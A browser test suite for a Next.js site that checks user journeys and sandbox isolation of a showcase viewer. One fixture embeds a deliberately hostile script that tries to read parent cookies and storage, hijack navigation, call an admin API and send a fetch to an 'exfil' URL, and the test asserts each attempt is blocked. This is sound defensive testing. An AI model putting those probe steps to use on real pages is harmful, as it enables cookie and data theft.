import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";

import { chromium } from "playwright";

import {
  createTempWorkspace,
  logTail,
  reservePort,
  startMockUpstream,
  startNextServer,
  stopNextServer,
  waitForServer,
} from "./http-suite/harness.mjs";
import {
  openDatabase,
  startDatabaseServer,
  waitForSchema,
} from "./http-suite/db.mjs";
import {
  BUILD_ID,
  seedPublishedBuild,
  SHOWCASE_MODEL_ID,
  SOURCE_ID as SHOWCASE_SOURCE_ID,
} from "./http-suite/showcase-checks.mjs";
import { seedCatalog } from "./http-suite/seed.mjs";
import { catalogIdentityDigest, sha256Hex } from "../lib/visual-builds/types.ts";

const REPO = process.cwd();
const BUILD_MARKER = join(REPO, ".next", "BUILD_ID");
const SHOWCASE_ONLY = process.argv.includes("--showcase");
const ARTIFACT_DIR = join(REPO, ".scratch", "browser-matrix");
const ARTIFACT_JSON = join(
  ARTIFACT_DIR,
  SHOWCASE_ONLY ? "showcase-result.json" : "result.json",
);
const MOBILE = { width: 390, height: 844 };
const DESKTOP = { width: 1280, height: 900 };
const PASSWORD = "browser-matrix-password";
const ADMIN_PASSWORD = "browser-matrix-admin-password";
const ADMIN_SECRET = "browser-matrix-admin-secret-0123456789";
const PROVIDER_KEY = "browser-matrix-provider-key";
const ITEM_ID = "browser-suite-video";
const ITEM_TITLE = "Browser Suite Video";
const COMMENT_AUTHOR = "Browser Fixture Commenter";
const COMMENT_BODY = "A top-level fixture comment for the reply journey.";
const SOURCE_ID = "browser-suite-source";
const COMMENT_ID = "browser-suite-comment";
const HOSTILE_BUILD_ID = "bld_browser_hostile";
const HOSTILE_REVISION_ID = "rev_browser_hostile";
const HOSTILE_TITLE = "Hostile browser probe";
const COVERAGE_MODEL_ID = "mock-paid";
const COVERAGE_EMPTY_MODEL_ID = "free/mock-free";
const COVERAGE_FIXTURES = [
  {
    id: "browser-coverage-video",
    title: "Coverage Video With Player",
    kind: "video",
    relation: "release",
    thumbnailUrl: "/images/og.png",
    videoId: "dQw4w9WgXcQ",
    github: null,
    reason: "The fixture title exactly names the paid model.",
  },
  {
    id: "browser-coverage-invalid-video",
    title: "Coverage Invalid Video",
    kind: "video",
    relation: "hands_on",
    thumbnailUrl: "/images/banner.png",
    videoId: "bad/id",
    github: null,
    reason: "A malformed video id must stay a detail link.",
  },
  {
    id: "browser-coverage-article",
    title: "Coverage Article Fallback",
    kind: "article",
    relation: "mention",
    thumbnailUrl: null,
    videoId: null,
    github: null,
    reason: "A missing image must use the shared Signal fallback.",
  },
  {
    id: "browser-coverage-repo",
    title: "Coverage Repository Image",
    kind: "repo",
    relation: "repository",
    thumbnailUrl: null,
    videoId: null,
    github: {
      slug: "savant-gateway/coverage-fixture",
      description: "Browser fixture repository.",
      stars: 1200,
      forks: 80,
      language: "TypeScript",
      topics: ["ai"],
      license: "MIT",
      homepage: null,
      pushedAt: null,
      ogImageUrl: "/images/icon-192.png",
      readmeHtml: null,
    },
    reason: "The GitHub image is used when no stored thumbnail exists.",
  },
  {
    id: "browser-coverage-paper",
    title: "Coverage Paper Thumbnail",
    kind: "paper",
    relation: "paper",
    thumbnailUrl: "/images/icon-512.png",
    videoId: null,
    github: null,
    reason: "A paper with a stored thumbnail must render it.",
  },
  {
    id: "browser-coverage-discussion",
    title: "Coverage Discussion Fallback",
    kind: "discussion",
    relation: "discussion",
    thumbnailUrl: null,
    videoId: null,
    github: null,
    reason: "A discussion without an image still renders a row.",
  },
  {
    id: "browser-coverage-older",
    title: "Coverage Older Article",
    kind: "article",
    relation: "benchmark",
    thumbnailUrl: "/images/banner.png",
    videoId: null,
    github: null,
    reason: "This seventh item must fall outside the six-row limit.",
  },
];

function edgePath() {
  if (process.platform !== "win32") return null;

  const candidates = [
    "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe",
    "C:/Program Files/Microsoft/Edge/Application/msedge.exe",
  ];

  return candidates.find((candidate) => existsSync(candidate)) ?? null;
}

async function launchBrowser() {
  const requestedChannel = process.env.PLAYWRIGHT_CHANNEL?.trim();

  if (requestedChannel) {
    console.log(`browser-matrix: launching channel ${requestedChannel}`);
    const browser = await chromium.launch({
      channel: requestedChannel,
      headless: true,
      args: ["--enable-unsafe-swiftshader"],
    });

    return { browser, label: `Playwright channel ${requestedChannel}` };
  }

  if (SHOWCASE_ONLY) {
    try {
      console.log("browser-matrix: launching bundled Chromium");
      const browser = await chromium.launch({
        headless: true,
        args: ["--enable-unsafe-swiftshader"],
      });

      return { browser, label: "Playwright bundled Chromium" };
    } catch (error) {
      console.log(
        `browser-matrix: bundled Chromium unavailable, falling back (${error instanceof Error ? error.message : String(error)})`,
      );
    }
  }

  const edge = edgePath();

  if (edge) {
    console.log("browser-matrix: launching installed Microsoft Edge");
    const browser = await chromium.launch({
      channel: "msedge",
      headless: true,
      args: ["--enable-unsafe-swiftshader"],
    });

    return { browser, label: "Microsoft Edge via Playwright" };
  }

  try {
    console.log("browser-matrix: launching bundled Chromium");
    const browser = await chromium.launch({
      headless: true,
      args: ["--enable-unsafe-swiftshader"],
    });

    return { browser, label: "Playwright bundled Chromium" };
  } catch (error) {
    const detail = error instanceof Error ? error.message : String(error);
    throw new Error(
      "No usable browser. Install Microsoft Edge or run " +
        `\`npx playwright install chromium\`; ${detail}`,
    );
  }
}

async function apiJson(url, options) {
  const response = await fetch(url, options);
  const text = await response.text();
  let json = null;

  try {
    json = JSON.parse(text);
  } catch {
    json = null;
  }

  return { response, text, json };
}

async function signup(baseUrl, email, name) {
  const result = await apiJson(`${baseUrl}/api/auth/signup`, {
    method: "POST",
    headers: { "content-type": "application/json", origin: baseUrl },
    body: JSON.stringify({
      email,
      name,
      password: PASSWORD,
      acceptedPolicies: true,
    }),
  });

  assert.equal(
    result.response.status,
    201,
    `fixture signup ${email} failed: ${result.text}`,
  );
  assert.ok(result.json?.customer?.id, `fixture signup ${email} returned no id`);

  return result.json.customer;
}

async function waitForContentSchema(db) {
  const deadline = Date.now() + 60_000;
  let lastError = null;

  while (Date.now() < deadline) {
    try {
      const rows = await db.query(
        `SELECT to_regclass('content.items')::text AS items,
                to_regclass('content.model_links')::text AS links,
                (SELECT COUNT(*)::int
                   FROM information_schema.columns
                  WHERE table_schema = 'content'
                    AND table_name = 'sources'
                    AND column_name = 'last_success_at') AS success_column,
                (SELECT COUNT(*)::int
                   FROM information_schema.columns
                  WHERE table_schema = 'content'
                    AND table_name = 'comments'
                    AND column_name = 'parent_id') AS parent_column`,
      );

      if (
        rows[0]?.items &&
        rows[0]?.links &&
        rows[0]?.success_column === 1 &&
        rows[0]?.parent_column === 1
      ) {
        return;
      }
    } catch (error) {
      lastError = error;
    }

    await new Promise((resolve) => setTimeout(resolve, 250));
  }

  throw new Error(
    `content schema not ready: ${
      lastError instanceof Error ? lastError.message : "timeout"
    }`,
  );
}

async function seedContent(db, commenterId) {
  const now = new Date().toISOString();

  await db
    .prepare(
      `INSERT INTO content.sources
        (id, kind, label, url, config_json, enabled, fetch_interval_minutes,
         max_items, status, failure_streak, last_fetched_at, last_success_at,
         created_at, updated_at)
       VALUES (?, 'youtube', 'Browser Suite Source',
         'https://www.youtube.com/@browser-suite', '{}', 1, 60, 20,
         'active', 0, ?, ?, ?, ?)`,
    )
    .run(SOURCE_ID, now, now, now, now);

  await db
    .prepare(
      `INSERT INTO content.items
        (id, source_id, kind, title, url, external_url, excerpt, body_html,
         author, published_at, fetched_at, thumbnail_url, video_id, external_id,
         content_hash, created_at, updated_at)
       VALUES (?, ?, 'video', ?, ?, NULL, ?, ?, 'Browser Suite',
         ?, ?, NULL, 'dQw4w9WgXcQ', 'browser-suite-video', 'browser-fixture',
         ?, ?)`,
    )
    .run(
      ITEM_ID,
      SOURCE_ID,
      ITEM_TITLE,
      "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      "A deterministic fixture item for the browser interaction receipt.",
      "<p>Browser fixture body.</p>",
      now,
      now,
      now,
      now,
    );

  await db
    .prepare("INSERT INTO content.item_tags (item_id, tag) VALUES (?, ?)")
    .run(ITEM_ID, "ai");
  await db
    .prepare("INSERT INTO content.item_tags (item_id, tag) VALUES (?, ?)")
    .run(ITEM_ID, "video");

  await db
    .prepare(
      `INSERT INTO content.comments
        (id, item_id, user_id, parent_id, body, created_at)
       VALUES (?, ?, ?, NULL, ?, ?)`,
    )
    .run(COMMENT_ID, ITEM_ID, commenterId, COMMENT_BODY, now);
}

async function seedCoverage(db) {
  const now = Date.now();
  const nowIso = new Date(now).toISOString();
  const insertItem = db.prepare(
    `INSERT INTO content.items
      (id, source_id, kind, title, url, external_url, excerpt, body_html,
       author, published_at, fetched_at, thumbnail_url, video_id, external_id,
       github_json, content_hash, created_at, updated_at)
     VALUES (?, ?, ?, ?, ?, NULL, ?, NULL, 'Browser Suite', ?, ?, ?, ?, ?,
       ?, ?, ?, ?)`,
  );
  const insertLink = db.prepare(
    `INSERT INTO content.model_links
      (item_id, model_id, relation, relation_source, confidence, reason,
       reviewed, created_at, updated_at, state, decision_at,
       decision_source, revision)
     VALUES (?, ?, ?, 'operator', 1, ?, 1, ?, ?, 'accepted', ?,
       'operator', 1)`,
  );

  // Index 0 is newest; the seventh item is deliberately older than the six-item
  // model-page limit so total and displayed counts cannot be confused.
  for (const [index, fixture] of COVERAGE_FIXTURES.entries()) {
    const publishedAt = new Date(now - index * 60_000).toISOString();
    const githubJson = fixture.github ? JSON.stringify(fixture.github) : null;

    await insertItem.run(
      fixture.id,
      SOURCE_ID,
      fixture.kind,
      fixture.title,
      `https://example.test/coverage/${fixture.id}`,
      `${fixture.title} fixture for the coverage browser check.`,
      publishedAt,
      nowIso,
      fixture.thumbnailUrl,
      fixture.videoId,
      `external-${fixture.id}`,
      githubJson,
      `hash-${fixture.id}`,
      publishedAt,
      nowIso,
    );
    await insertLink.run(
      fixture.id,
      COVERAGE_MODEL_ID,
      fixture.relation,
      fixture.reason,
      publishedAt,
      nowIso,
      publishedAt,
    );
  }
}

async function assertTheme(page, theme) {
  await page.waitForFunction(
    (expected) => document.documentElement.classList.contains(expected),
    theme,
    { timeout: 15_000 },
  );

  const scheme = await page.evaluate(
    () => getComputedStyle(document.documentElement).colorScheme,
  );

  assert.match(
    scheme,
    new RegExp(theme),
    `resolved color-scheme is ${JSON.stringify(scheme)}, expected ${theme}`,
  );
}

async function assertVisibleFocus(page) {
  // Blurring is not enough: the browser keeps its sequential-focus starting
  // point at the last clicked control. Move focus to the body itself so Tab
  // starts at the first tabbable element in document order.
  await page.evaluate(() => {
    const body = document.body;

    body.tabIndex = -1;
    body.focus();
    body.removeAttribute("tabindex");
  });
  await page.keyboard.press("Tab");

  const focus = await page.evaluate(() => {
    const element = document.activeElement;
    const style = element ? getComputedStyle(element) : null;

    return {
      text: element?.textContent?.trim() ?? "",
      outlineStyle: style?.outlineStyle ?? "none",
      outlineWidth: Number.parseFloat(style?.outlineWidth ?? "0"),
      boxShadow: style?.boxShadow ?? "none",
    };
  });

  assert.equal(focus.text, "Skip to content", "the first Tab target is the skip link");
  assert.ok(
    focus.outlineStyle !== "none" ||
      focus.outlineWidth > 0 ||
      focus.boxShadow !== "none",
    "the focused skip link has no visible focus indicator",
  );
}

async function assertNoHorizontalOverflow(page) {
  const overflow = await page.evaluate(
    () => document.documentElement.scrollWidth - window.innerWidth,
  );

  assert.ok(overflow <= 1, `mobile layout overflows by ${overflow}px`);
}

function trackErrors(page, options = {}) {
  const errors = [];

  page.on("pageerror", (error) => {
    errors.push(`pageerror: ${error.message}`);
  });

  page.on("console", (message) => {
    if (message.type() !== "error") return;

    const url = message.location().url;

    if (url && !url.startsWith("http://127.0.0.1")) return;
    if (
      options.ignoreCsp &&
      /Content Security Policy|Refused to connect|Blocked opening/.test(
        message.text(),
      )
    ) {
      return;
    }

    errors.push(`console: ${message.text()}`);
  });

  return errors;
}

async function screenshotFailure(page, theme, journey) {
  const path = join(ARTIFACT_DIR, `${theme}-${journey.replace(/\W+/g, "-")}.png`);

  await mkdir(ARTIFACT_DIR, { recursive: true });
  await page
    .screenshot({
      path,
      fullPage: true,
      mask: [page.locator("pre"), page.locator("input[type=password]")],
    })
    .catch(() => {});

  return path;
}

async function journey(theme, name, page, errors, action) {
  try {
    await action();
    assert.deepEqual(errors, [], `${theme}/${name}: ${errors.join("; ")}`);
    console.log(`browser-matrix: ${theme} ${name} PASS`);
  } catch (error) {
    const shot = await screenshotFailure(page, theme, name);
    const detail = error instanceof Error ? error.message : String(error);

    console.error(`browser-matrix: ${theme} ${name} FAIL: ${detail}`);
    console.error(`browser-matrix: failure screenshot ${shot}`);
    throw error;
  }
}

async function signInAtMobile(page, baseUrl, account) {
  await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });
  await assertTheme(page, account.theme);
  await page.getByLabel("Email").fill(account.email);
  await page.getByLabel("Password").fill(PASSWORD);
  await page.getByRole("button", { name: "Sign in", exact: true }).click();
  await page.waitForURL("**/account", { timeout: 20_000 });
  await page
    .getByRole("heading", { level: 1, name: account.name })
    .waitFor({ timeout: 20_000 });
  await assertNoHorizontalOverflow(page);
}

async function keyAndTopup(page) {
  await page.getByLabel("Key name").fill("Browser matrix key");
  await page.getByRole("button", { name: "Create key" }).click();
  await page.getByText("Copy this secret now").waitFor({ timeout: 20_000 });

  const secret = await page
    .locator("pre")
    .filter({ hasText: /^sk-[A-Za-z0-9_-]+$/ })
    .first()
    .textContent();

  assert.match(secret ?? "", /^sk-[A-Za-z0-9_-]{8,}$/);

  await page.getByText("Add credit", { exact: true }).waitFor();
  await page
    .getByLabel("Top-up amount in US dollars")
    .waitFor({ state: "visible" });
  await page
    .getByRole("button", { name: "Continue with Card" })
    .waitFor({ state: "visible" });
}

async function paletteJourney(page, baseUrl) {
  await page.goto(`${baseUrl}/models`, { waitUntil: "domcontentloaded" });
  await page.getByRole("heading", { level: 1 }).waitFor();

  await page.keyboard.press("Control+K");
  const dialog = page.getByRole("dialog", { name: "Search Signal" });

  await dialog.waitFor({ state: "visible" });
  assert.equal(
    await page.evaluate(() => document.activeElement?.id),
    "command-palette-input",
    "the palette input receives focus",
  );

  await page.keyboard.press("Escape");
  await dialog.waitFor({ state: "hidden" });

  await page.getByRole("button", { name: "Search Signal" }).click();
  await dialog.waitFor({ state: "visible" });

  await page.getByLabel("Search Signal items, models, and topics").fill("Suite");
  await page.getByRole("option").filter({ hasText: ITEM_TITLE }).waitFor({
    timeout: 15_000,
  });
  assert.ok(
    (await page.getByRole("option").count()) >= 2,
    "the palette returns the item and the catalog model",
  );

  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("ArrowUp");
  await page.keyboard.press("Enter");
  await page.waitForURL(`**/signal/${ITEM_ID}`, { timeout: 15_000 });
}

async function videoJourney(page, baseUrl) {
  await page.goto(`${baseUrl}/signal?kind=video`, { waitUntil: "domcontentloaded" });
  const trigger = page.getByRole("button", { name: `Play ${ITEM_TITLE}` });

  await trigger.waitFor({ state: "visible" });
  await trigger.focus();
  await page.keyboard.press("Enter");

  const dialog = page.getByRole("dialog", { name: ITEM_TITLE });

  await dialog.waitFor({ state: "visible" });
  await page.keyboard.press("Escape");
  await dialog.waitFor({ state: "hidden" });
  await page.waitForFunction(
    (title) =>
      document.activeElement?.getAttribute("aria-label") === `Play ${title}`,
    ITEM_TITLE,
  );
}

async function replyJourney(page, baseUrl, theme) {
  await page.goto(`${baseUrl}/signal/${ITEM_ID}`, { waitUntil: "domcontentloaded" });

  const summary = page
    .locator("summary")
    .filter({ hasText: `Reply to ${COMMENT_AUTHOR}` });

  await summary.waitFor({ state: "visible" });
  await summary.click();

  const reply = `Reply from the ${theme} browser journey.`;

  await page.locator('textarea[placeholder^="Reply to"]').fill(reply);
  await page.getByRole("button", { name: "Post reply" }).click();
  await page.getByText(reply, { exact: true }).waitFor({ timeout: 20_000 });
}

async function reactionJourney(page, baseUrl) {
  await page.goto(`${baseUrl}/signal/${ITEM_ID}`, { waitUntil: "domcontentloaded" });

  const useful = page.getByRole("button", { name: /^Useful\b/ });

  await useful.waitFor({ state: "visible" });
  assert.equal(
    await useful.getAttribute("aria-pressed"),
    "false",
    "the fixture reaction starts unselected",
  );
  await useful.click();
  await page.waitForFunction(() => {
    const button = [...document.querySelectorAll("button")].find((entry) =>
      entry.textContent?.trim().startsWith("Useful"),
    );

    return button?.getAttribute("aria-pressed") === "true";
  });
}

function coverageSection(page) {
  return page
    .getByRole("heading", { level: 2, name: "Coverage", exact: true })
    .locator("xpath=ancestor::section[1]");
}

async function coverageJourney(page, baseUrl, theme) {
  const valid = COVERAGE_FIXTURES[0];
  const invalid = COVERAGE_FIXTURES[1];
  const fallback = COVERAGE_FIXTURES[2];
  const repository = COVERAGE_FIXTURES[3];
  const older = COVERAGE_FIXTURES[6];
  const displayed = COVERAGE_FIXTURES.slice(0, 6);

  for (const viewport of [MOBILE, DESKTOP]) {
    await page.setViewportSize(viewport);
    await page.goto(`${baseUrl}/models/${COVERAGE_MODEL_ID}`, {
      waitUntil: "domcontentloaded",
    });

    const section = coverageSection(page);

    await section
      .getByRole("heading", { level: 2, name: "Coverage", exact: true })
      .waitFor();
    await assertTheme(page, theme);
    await assertNoHorizontalOverflow(page);

    const rows = section.locator("ul > li");

    assert.equal(
      await rows.count(),
      6,
      "the model page renders exactly six coverage rows",
    );
    assert.equal(
      await section.getByText(older.title, { exact: true }).count(),
      0,
      "the seventh, older item is outside the limit",
    );
    assert.equal(
      await section.getByText("Benchmark", { exact: true }).count(),
      0,
      "relation counts describe displayed rows, not all linked pieces",
    );
    await section
      .getByText(/Showing the newest 6 of 7 linked pieces\./)
      .waitFor();
    assert.equal(
      await section.locator("iframe").count(),
      0,
      "no video iframe exists before activation",
    );
    assert.equal(
      await section.locator("a a, button a, a button, button button").count(),
      0,
      "coverage rows do not nest interactive controls",
    );

    for (const fixture of displayed) {
      const title = section.getByRole("link", {
        name: fixture.title,
        exact: true,
      });

      assert.equal(await title.count(), 1, `${fixture.title} has one title link`);
      assert.equal(await title.getAttribute("href"), `/signal/${fixture.id}`);
    }

    const storedStyle = await rows
      .filter({ hasText: valid.title })
      .locator('span[style*="background-image"]')
      .first()
      .getAttribute("style");
    const fallbackStyle = await rows
      .filter({ hasText: fallback.title })
      .locator('span[style*="background-image"]')
      .first()
      .getAttribute("style");
    const repoStyle = await rows
      .filter({ hasText: repository.title })
      .locator('span[style*="background-image"]')
      .first()
      .getAttribute("style");

    assert.match(storedStyle ?? "", /\/images\/og\.png/);
    assert.match(fallbackStyle ?? "", /thumb/);
    assert.match(repoStyle ?? "", /\/images\/icon-192\.png/);

    const invalidRow = rows.filter({ hasText: invalid.title });

    assert.equal(
      await invalidRow.getByRole("button").count(),
      0,
      "an invalid video id has no play trigger",
    );
    assert.equal(
      await invalidRow
        .getByRole("link", { name: `Open ${invalid.title}` })
        .getAttribute("href"),
      `/signal/${invalid.id}`,
    );

    const trigger = rows
      .filter({ hasText: valid.title })
      .getByRole("button", { name: `Play ${valid.title}` });

    await trigger.waitFor({ state: "visible" });

    if (viewport.width === MOBILE.width) {
      await trigger.click();
    } else {
      await trigger.focus();
      await page.keyboard.press("Enter");
    }

    const dialog = page.getByRole("dialog", { name: valid.title });

    await dialog.waitFor({ state: "visible" });
    assert.equal(await dialog.locator("iframe").count(), 1);
    await page.keyboard.press("Escape");
    await dialog.waitFor({ state: "hidden" });
    await page.waitForFunction(
      (title) =>
        document.activeElement?.getAttribute("aria-label") === `Play ${title}`,
      valid.title,
    );

    if (viewport.width === MOBILE.width) {
      await rows
        .filter({ hasText: fallback.title })
        .getByRole("link", { name: `Open ${fallback.title}` })
        .click();
      await page.waitForURL(`**/signal/${fallback.id}`, { timeout: 15_000 });
      await page.goBack({ waitUntil: "domcontentloaded" });
      await page
        .getByRole("heading", { level: 2, name: "Coverage", exact: true })
        .waitFor();
    }

    await page.goto(`${baseUrl}/models/${COVERAGE_EMPTY_MODEL_ID}`, {
      waitUntil: "domcontentloaded",
    });

    const emptySection = coverageSection(page);

    await emptySection.getByText(/No coverage yet\./).waitFor();
    assert.equal(await emptySection.locator("ul > li").count(), 0);
    assert.equal(
      await emptySection.getByText(/Showing the newest/).count(),
      0,
      "an empty model does not show a total message",
    );

    const emptyWidth = await emptySection.evaluate((element) => ({
      client: element.clientWidth,
      scroll: element.scrollWidth,
    }));

    assert.ok(
      emptyWidth.scroll <= emptyWidth.client + 1,
      `the empty coverage section overflows by ${emptyWidth.scroll - emptyWidth.client}px`,
    );
  }
}

async function catalogJourney(page, baseUrl) {
  await page.goto(`${baseUrl}/models`, { waitUntil: "domcontentloaded" });
  const search = page.getByPlaceholder(
    "Search model, id, family, or OpenRouter id",
  );

  await search.waitFor({ state: "visible" });
  await search.fill("HTTP Suite Paid");
  await page.getByText("1 shown", { exact: false }).waitFor({ timeout: 10_000 });

  assert.ok(
    await page
      .getByRole("link")
      .filter({ hasText: "HTTP Suite Paid Model" })
      .first()
      .isVisible(),
    "the paid fixture model survives the filter",
  );
  assert.equal(
    await page
      .getByRole("link")
      .filter({ hasText: "HTTP Suite Free Model" })
      .count(),
    0,
    "the free fixture model is filtered out",
  );

  await page
    .getByRole("link")
    .filter({ hasText: "HTTP Suite Paid Model" })
    .first()
    .click();
  await page.waitForURL("**/models/mock-paid", { timeout: 15_000 });
  await page.goBack({ waitUntil: "domcontentloaded" });
  await page.waitForURL("**/models", { timeout: 15_000 });
  await page.getByRole("heading", { level: 1 }).waitFor();
}

async function seedHostileBuild(db, baseUrl) {
  const artifact = `
export function createPelicanSdf(canvas) {
  const state = window.__hostile = { done: false };
  try { parent.document.body; state.parentDocument = "read"; }
  catch { state.parentDocument = "blocked"; }
  try { parent.document.cookie; state.parentCookie = "read"; }
  catch { state.parentCookie = "blocked"; }
  try { parent.localStorage.length; state.parentStorage = "read"; }
  catch { state.parentStorage = "blocked"; }
  try { state.popup = window.open("https://example.com") ? "opened" : "blocked"; }
  catch { state.popup = "blocked"; }
  try { top.location.href = "https://example.com"; state.topNavigation = "set"; }
  catch { state.topNavigation = "blocked"; }
  fetch("https://example.com/exfil").then(
    () => { state.exfil = "sent"; },
    () => { state.exfil = "blocked"; },
  );
  fetch("${baseUrl}/api/admin/showcase", { credentials: "include" }).then(
    (response) => { state.adminStatus = response.status; state.done = true; },
    () => { state.adminStatus = "blocked"; state.done = true; },
  );
  const gl = canvas.getContext("webgl2");
  if (gl) {
    gl.clearColor(0.1, 0.55, 0.8, 1);
    gl.clear(gl.COLOR_BUFFER_BIT);
  }
}
`;
  const bytes = Buffer.from(artifact, "utf8");
  const sha = sha256Hex(artifact);
  const now = new Date().toISOString();
  const digest = catalogIdentityDigest({
    id: SHOWCASE_MODEL_ID,
    upstreamId: SHOWCASE_MODEL_ID,
    name: "Showcase HTTP Model",
    family: "Pelican Test",
    inCatalog: true,
    status: "active",
  });

  await db
    .prepare(
      `INSERT INTO showcase.assets
        (id, source_id, sha256, mime, kind, bytes, byte_size, created_at)
       VALUES ('ast_browser_hostile', ?, ?, 'text/javascript; charset=utf-8',
               'artifact', ?, ?, ?)
       ON CONFLICT (id) DO NOTHING`,
    )
    .run(SHOWCASE_SOURCE_ID, sha, bytes, bytes.length, now);
  await db
    .prepare(
      `INSERT INTO showcase.builds
        (id, source_id, external_id, visibility, published_revision_id,
         published_at, created_at, updated_at)
       VALUES (?, ?, 'browser-hostile', 'published', ?, ?, ?, ?)
       ON CONFLICT (id) DO NOTHING`,
    )
    .run(
      HOSTILE_BUILD_ID,
      SHOWCASE_SOURCE_ID,
      HOSTILE_REVISION_ID,
      now,
      now,
      now,
    );
  await db
    .prepare(
      `INSERT INTO showcase.revisions
        (id, build_id, revision_key, source_id, source_url, source_revision,
         title, description, original_model_id, original_model_label, creator,
         provider, task, effort, harness, source_status, validation_state,
         source_created_at, prompt_text, prompt_sha256, raw_record_json,
         raw_record_sha256, cost_usd_micros, generation_ms, artifact_asset_id,
         thumbnail_asset_id, license_text, license_sha256, created_at)
       VALUES (?, ?, 'hostile-key', ?, 'https://example.test/hostile',
               'browser-revision', ?, 'Sandbox isolation fixture.',
               'hostile-model', 'Hostile model', 'Browser suite', 'Fixture',
               'one-shot', 'high', 'browser', 'unverified', 'passed', ?, ?, ?,
               '{}', ?, NULL, NULL, 'ast_browser_hostile', NULL, 'MIT License',
               ?, ?)
       ON CONFLICT (id) DO NOTHING`,
    )
    .run(
      HOSTILE_REVISION_ID,
      HOSTILE_BUILD_ID,
      SHOWCASE_SOURCE_ID,
      HOSTILE_TITLE,
      now,
      "hostile prompt",
      sha256Hex("hostile prompt"),
      sha256Hex("{}"),
      sha256Hex("MIT License"),
      now,
    );
  await db
    .prepare(
      `INSERT INTO showcase.bindings
        (id, revision_id, model_id, state, method, reason, catalog_digest,
         reviewer, reviewed_at, created_at)
       VALUES ('bnd_browser_hostile', ?, ?, 'accepted', 'exact_id',
               'Browser hostile fixture.', ?, 'browser-suite', ?, ?)
       ON CONFLICT (id) DO NOTHING`,
    )
    .run(HOSTILE_REVISION_ID, SHOWCASE_MODEL_ID, digest, now, now);
}

async function viewerFrame(page) {
  const iframe = page.locator('iframe[title*="interactive visual build"]');

  await iframe.waitFor({ state: "visible" });

  const handle = await iframe.elementHandle();
  const frame = await handle?.contentFrame();

  assert.ok(frame, "the sandboxed viewer frame is attached");
  await frame.waitForSelector("canvas", { timeout: 30_000 });

  return { iframe, frame };
}

async function showcaseRenderJourney(page, baseUrl, theme) {
  for (const width of [320, 1024, 1440]) {
    await page.setViewportSize({
      width,
      height: width === 320 ? 844 : 900,
    });
    await page.goto(`${baseUrl}/showcase`, { waitUntil: "domcontentloaded" });
    await page.getByRole("heading", { level: 1, name: /One prompt/ }).waitFor();
    await assertNoHorizontalOverflow(page);

    const card = page.locator(`a[href="/showcase/${BUILD_ID}"]`).first();

    await card.waitFor({ state: "visible" });
    await card.click();
    await page.waitForURL(`**/showcase/${BUILD_ID}`, { timeout: 15_000 });
    await page.getByRole("heading", { level: 1, name: /GPT-6.1 Sol/ }).waitFor();
    await assertNoHorizontalOverflow(page);
    await assertTheme(page, theme);

    const { iframe, frame } = await viewerFrame(page);
    const pixels = await frame.evaluate(() => {
      const canvas = document.querySelector("canvas");
      const gl = canvas?.getContext("webgl2");

      if (!canvas || !gl) return null;

      const data = new Uint8Array(4 * 16);

      gl.readPixels(0, 0, 4, 4, gl.RGBA, gl.UNSIGNED_BYTE, data);

      return {
        width: canvas.width,
        height: canvas.height,
        sum: data.reduce((total, value) => total + value, 0),
      };
    });

    assert.ok(
      pixels && pixels.width > 0 && pixels.height > 0,
      "the artifact has a WebGL canvas",
    );
    assert.ok(pixels.sum > 0, "the artifact rendered non-blank WebGL pixels");

    const before = await iframe.screenshot();

    assert.ok(
      before.length > 5_000,
      `the rendered frame is not blank (${before.length} bytes)`,
    );

    await frame.locator("canvas").click({ position: { x: 40, y: 40 } });
    await page.keyboard.press("ArrowRight");

    const box = await iframe.boundingBox();

    assert.ok(box, "the viewer frame has a layout box");
    await page.touchscreen.tap(box.x + box.width / 2, box.y + box.height / 2);
    await page.mouse.move(box.x + 20, box.y + 20);
    await page.mouse.down();
    await page.mouse.move(box.x + box.width - 20, box.y + box.height / 2, {
      steps: 8,
    });
    await page.mouse.up();

    const after = await iframe.screenshot();

    assert.ok(after.length > 5_000, "the frame still renders after pointer input");
    assert.notDeepEqual(
      after,
      before,
      "keyboard, touch or pointer input reached the artifact",
    );
  }
}

async function showcaseHostileJourney(page, baseUrl) {
  await page.goto(`${baseUrl}/showcase/${HOSTILE_BUILD_ID}`, {
    waitUntil: "domcontentloaded",
  });      await page.getByRole("heading", { level: 1, name: HOSTILE_TITLE }).waitFor();

  const { iframe, frame } = await viewerFrame(page);

  await frame.waitForFunction(() => window.__hostile?.done === true, null, {
    timeout: 15_000,
  });

  const probe = await frame.evaluate(() => window.__hostile);

  assert.equal(probe.parentDocument, "blocked", "parent DOM is unreachable");
  assert.equal(probe.parentCookie, "blocked", "parent cookies are unreachable");
  assert.equal(probe.parentStorage, "blocked", "parent storage is unreachable");
  assert.equal(probe.popup, "blocked", "popups are blocked");
  assert.equal(probe.exfil, "blocked", "outbound exfiltration is blocked");
  assert.equal(probe.adminStatus, "blocked", "the parent admin API is unreachable");
  assert.equal(
    page.url(),
    `${baseUrl}/showcase/${HOSTILE_BUILD_ID}`,
    "top navigation was blocked",
  );

  const shot = await iframe.screenshot();

  assert.ok(
    shot.length > 1_000,
    "the hostile artifact still rendered inside the frame",
  );

  const bundle = await page.request.get(`${baseUrl}/api/showcase/${BUILD_ID}`);

  assert.match(bundle.headers()["content-type"] ?? "", /application\/json/);
  assert.ok(
    (await bundle.text()).trim().startsWith("{"),
    "the direct source route serves JSON, not HTML",
  );

  await page.goto(`${baseUrl}/showcase`, { waitUntil: "domcontentloaded" });
  await page.getByRole("heading", { level: 1, name: /One prompt/ }).waitFor();
  assert.equal(
    page.frames().length,
    1,
    "leaving the detail page destroys the viewer frame",
  );
}

async function runShowcaseTheme(browser, baseUrl, theme) {
  const context = await browser.newContext({
    viewport: MOBILE,
    colorScheme: theme,
    deviceScaleFactor: 1,
    hasTouch: true,
  });

  await context.addInitScript((value) => {
    try {
      window.localStorage.setItem("theme", value);
      window.localStorage.setItem("next-themes", value);
    } catch {
      // The sandboxed viewer has an opaque origin and cannot use host storage.
    }
  }, theme);
  await context.route("**/*", async (route) => {
    const url = new URL(route.request().url());
    const loopback =
      url.hostname === "127.0.0.1" ||
      url.hostname === "localhost" ||
      url.hostname === "::1";

    if (loopback) {
      if (url.pathname.startsWith("/_vercel/")) {
        await route.fulfill({
          status: 200,
          contentType: "application/javascript",
          body: "",
        });

        return;
      }

      await route.continue();

      return;
    }
